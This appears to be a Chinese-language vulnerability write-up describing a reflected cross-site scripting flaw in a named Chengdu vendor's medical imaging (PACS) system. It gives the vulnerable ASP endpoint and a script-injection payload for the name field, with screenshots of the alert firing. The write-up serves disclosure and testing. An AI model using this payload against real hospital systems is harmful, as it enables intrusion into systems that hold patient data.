# 成都信通网易医疗科技发展有限公司PACS(医学影像信息管理系统)存在XSS跨站脚本漏洞

# 一、漏洞简介
成都信通网易医疗科技发展有限公司总部位于四川成都高新区天府软件园，在国内医疗软件行业中率先采用Java技术，融入国际国内标准，整体设计，持续研发，先后形成了“智慧云医院信息平台”、“医共体信息平台”、“互联网医院平台”、“医养融合信息平台”等新一代一系列自主知识产权产品，全面覆盖了单体医院业务、区域医疗、医共体、“互联网+健康”等信息化建设领域。成都信通网易医疗科技发展有限公司PACS(医学影像信息管理系统)存在XSS跨站脚本漏洞。

# 二、影响版本
+ 成都信通网易医疗科技发展有限公司PACS(医学影像信息管理系统)

# 三、特征
![1700650941861-e1d2149c-0043-4e5b-8d5a-a051c63982a6.png](./img/rrHqPXIKH46qSxgA/1700650941861-e1d2149c-0043-4e5b-8d5a-a051c63982a6-836936.png)

# 四、漏洞复现
漏洞位置

```plain
/JcbgForYsz/Show_Jcbg_Ysz.asp
```

1. 在姓名处插入如下payload：`test"><script>alert("XSS")</script>`

![1700651459328-174f0fec-121d-4ec8-9787-77be487b9e62.png](./img/rrHqPXIKH46qSxgA/1700651459328-174f0fec-121d-4ec8-9787-77be487b9e62-804740.png)

2. 点击查询，成功触发：

![1700651521093-e0cef71d-5ae0-42d3-886b-78b0bb847be8.png](./img/rrHqPXIKH46qSxgA/1700651521093-e0cef71d-5ae0-42d3-886b-78b0bb847be8-116149.png)	



> 更新: 2024-02-29 23:55:28  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qno6ghgn37fbk4dg>